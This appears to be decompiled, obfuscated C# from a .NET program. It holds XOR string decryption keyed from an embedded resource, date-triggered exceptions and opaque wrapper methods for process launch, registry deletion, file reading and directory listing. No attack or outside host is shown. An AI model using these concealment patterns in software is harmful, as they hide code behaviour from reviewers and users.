using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using O;

namespace ns0;

internal sealed class Class12
{
	private sealed class Class13
	{
		public static readonly Class13 class13_0;

		internal byte[] byte_0;

		static Class13()
		{
			if (Class14.smethod_2(Class11.smethod_1(227, '\u009b'), new DateTime(635781201097687017L), 45, 108))
			{
				throw new Exception();
			}
			class13_0 = new Class13();
		}

		private Class13()
		{
			Assembly assembly = (Assembly)(ICustomAttributeProvider)GForm1.smethod_2(175, '¿');
			Stream stream = (Stream)(MarshalByRefObject)assembly.GetManifestResourceStream(smethod_1());
			if (stream != null)
			{
				byte[] array = (byte_0 = new byte[256]);
				stream.Read(byte_0, 0, byte_0.Length);
			}
		}

		public string method_0(string string_0, int int_0)
		{
			int num = GClass2.DRV.smethod_1(string_0, 77, 19);
			int num2 = int_0 & 0xFF;
			char[] array = (char[])(Array)string_0.ToCharArray();
			while (--num >= 0)
			{
				array[num] = (char)(array[num] ^ (byte_0[num2] | int_0));
			}
			return string.Intern(new string(array));
		}
	}

	public static string smethod_0(string string_0, int int_0)
	{
		if (Class14.smethod_2(Class11.smethod_1(219, '£'), new DateTime(635781201098517064L), 708, 645))
		{
			throw new Exception();
		}
		return string.Intern(Class13.class13_0.method_0(string_0, int_0));
	}

	[SpecialName]
	public static string smethod_1()
	{
		return Class14.smethod_0(Class16.smethod_0("ᑼᐨᑽᑸᐩᑺᑿᐮᐪᑿᐮᑸᑸᑺᑸᑸᐭᐩᐨᑾᑼᑻᐮᐪᑵᐭᐨᑸᑴᑸᐩᐭ", 57730), 62942);
	}

	internal static void smethod_2<T, U>(T gparam_0, U gparam_1, short short_0, char char_0) where T : Control where U : EventHandler
	{
		int num = 0;
		switch (((short_0 ^ char_0) - 25) ^ 0)
		{
		case 0:
			((Control)gparam_0).add_Resize((EventHandler)gparam_1);
			break;
		}
		num++;
	}

	internal static char smethod_3(int int_0, short short_0, short short_1)
	{
		int num = 0;
		char result = (((short_0 ^ short_1) - 78) ^ 0) switch
		{
			0 => Strings.Chr(int_0), 
			_ => '\u001e', 
		};
		num++;
		return result;
	}

	internal static int smethod_4(ref DateTime dateTime_0, short short_0, short short_1)
	{
		int num = 0;
		int result = (((short_1 ^ short_0) - 19) ^ 0) switch
		{
			0 => dateTime_0.Hour, 
			_ => 8, 
		};
		num++;
		return result;
	}

	internal static IntPtr smethod_5(int int_0, char char_0, char char_1)
	{
		int num = 0;
		IntPtr result;
		do
		{
			result = (((char_1 ^ char_0) - 2) ^ num) switch
			{
				1 => Marshal.AllocHGlobal(int_0), 
				0 => (IntPtr)int_0, 
				_ => default(IntPtr), 
			};
			num++;
		}
		while ((char_0 * char_0 + char_0) % 2 != 0);
		return result;
	}

	internal static bool smethod_6<T>(T gparam_0, int int_0, char char_0) where T : Keyboard
	{
		int num = 0;
		bool result;
		int num2;
		do
		{
			result = (((char_0 ^ int_0) - 76) ^ num) switch
			{
				0 => ((Keyboard)gparam_0).get_CapsLock(), 
				_ => true, 
			};
			num++;
			num2 = char_0 * char_0;
			num2 = char_0 + num2;
		}
		while (num2 % 2 != 0);
		return result;
	}

	internal static void smethod_7<T>(T gparam_0, short short_0, int int_0) where T : Stream
	{
		int num = 0;
		switch (((short_0 ^ int_0) - 51) ^ 0)
		{
		case 0:
			gparam_0.Dispose();
			break;
		}
		num++;
	}

	internal static bool smethod_8<T>(T gparam_0, short short_0, short short_1) where T : DriveInfo
	{
		int num = 0;
		bool result = (((short_1 ^ short_0) - 17) ^ 0) switch
		{
			0 => gparam_0.IsReady, 
			_ => true, 
		};
		num++;
		return result;
	}

	internal static string smethod_9(short short_0, short short_1)
	{
		int num = 0;
		string result;
		do
		{
			result = (((short_0 ^ short_1) - 100) ^ num) switch
			{
				2 => Path.GetTempPath(), 
				1 => Application.get_StartupPath(), 
				0 => Application.get_ExecutablePath(), 
				_ => null, 
			};
			num++;
		}
		while ((short_0 * short_0 + short_0) % 2 != 0);
		return result;
	}

	internal static string[] smethod_10<T>(T gparam_0, short short_0, char char_0) where T : string
	{
		int num = 0;
		string[] result = (((short_0 ^ char_0) - 54) ^ 0) switch
		{
			0 => Directory.GetFiles(gparam_0), 
			1 => Directory.GetDirectories(gparam_0), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static void smethod_11<T>(T gparam_0, Color color_0, int int_0, short short_0) where T : TextBoxBase
	{
		int num = 0;
		switch (((int_0 ^ short_0) - 120) ^ 0)
		{
		case 0:
			((TextBoxBase)gparam_0).set_BackColor(color_0);
			break;
		}
		num++;
	}

	internal static Cursor smethod_12(short short_0, char char_0)
	{
		int num = 0;
		Cursor result = (Cursor)((((char_0 ^ short_0) - 55) ^ 0) switch
		{
			0 => Cursors.get_Default(), 
			_ => null, 
		});
		num++;
		return result;
	}

	internal static void smethod_13<T, U, V>(U gparam_0, T gparam_1, V gparam_2, char char_0, short short_0) where T : Stream where U : Image where V : ImageFormat
	{
		int num = 0;
		do
		{
			switch (((short_0 ^ char_0) - 95) ^ num)
			{
			case 0:
				((Image)gparam_0).Save((Stream)gparam_1, (ImageFormat)(object)gparam_2);
				break;
			}
			num++;
		}
		while ((short_0 * short_0 + short_0) % 2 != 0);
	}

	internal static byte[] smethod_14<T>(T gparam_0, int int_0, int int_1) where T : string
	{
		int num = 0;
		byte[] result = (((int_1 ^ int_0) - 122) ^ 0) switch
		{
			0 => (byte[])(Array)File.ReadAllBytes(gparam_0), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static void smethod_15<T>(T gparam_0, int int_0, int int_1) where T : Form
	{
		int num = 0;
		switch (((int_1 ^ int_0) - 17) ^ 0)
		{
		case 0:
			((Form)gparam_0).Close();
			break;
		}
		num++;
	}

	internal static string smethod_16(bool bool_0, int int_0, short short_0)
	{
		int num = 0;
		string result;
		int num2;
		do
		{
			result = (((int_0 ^ short_0) - 64) ^ num) switch
			{
				0 => (string)(IEquatable<string>)Conversions.ToString(bool_0), 
				_ => null, 
			};
			num++;
			num2 = short_0 * short_0;
			num2 = short_0 + num2;
		}
		while (num2 % 2 != 0);
		return result;
	}

	internal static Size smethod_17(ref Rectangle rectangle_0, int int_0, char char_0)
	{
		int num = 0;
		Size result;
		do
		{
			result = (((char_0 ^ int_0) - 63) ^ num) switch
			{
				0 => rectangle_0.Size, 
				_ => default(Size), 
			};
			num++;
		}
		while ((char_0 * char_0 + char_0) % 2 != 0);
		return result;
	}

	internal static Process smethod_18<T, U>(U gparam_0, T gparam_1, char char_0, short short_0) where T : string where U : string
	{
		int num = 0;
		Process result = (((short_0 ^ char_0) - 14) ^ 0) switch
		{
			0 => (Process)(Component)Process.Start(gparam_0, gparam_1), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static string smethod_19<T>(T gparam_0, int int_0, short short_0) where T : ProcessModule
	{
		int num = 0;
		string result = (((int_0 ^ short_0) - 70) ^ 0) switch
		{
			0 => (string)(ICloneable)gparam_0.FileName, 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static void smethod_20<T, U>(T gparam_0, U gparam_1, int int_0, int int_1) where T : Process where U : EventHandler
	{
		int num = 0;
		switch (((int_0 ^ int_1) - 79) ^ 0)
		{
		case 0:
			gparam_0.Exited += gparam_1;
			break;
		}
		num++;
	}

	internal static void smethod_21<T, U>(T gparam_0, U gparam_1, short short_0, short short_1) where T : RegistryKey where U : string
	{
		int num = 0;
		do
		{
			switch (((short_1 ^ short_0) - 39) ^ num)
			{
			case 0:
				gparam_0.DeleteValue(gparam_1);
				break;
			}
			num++;
		}
		while ((short_1 * short_1 + short_1) % 2 != 0);
	}

	internal static void smethod_22<T, U>(U gparam_0, T gparam_1, char char_0, short short_0) where T : string where U : Control
	{
		int num = 0;
		switch (((char_0 ^ short_0) - 30) ^ 0)
		{
		case 0:
			((Control)gparam_0).set_Name((string)gparam_1);
			break;
		}
		num++;
	}
}
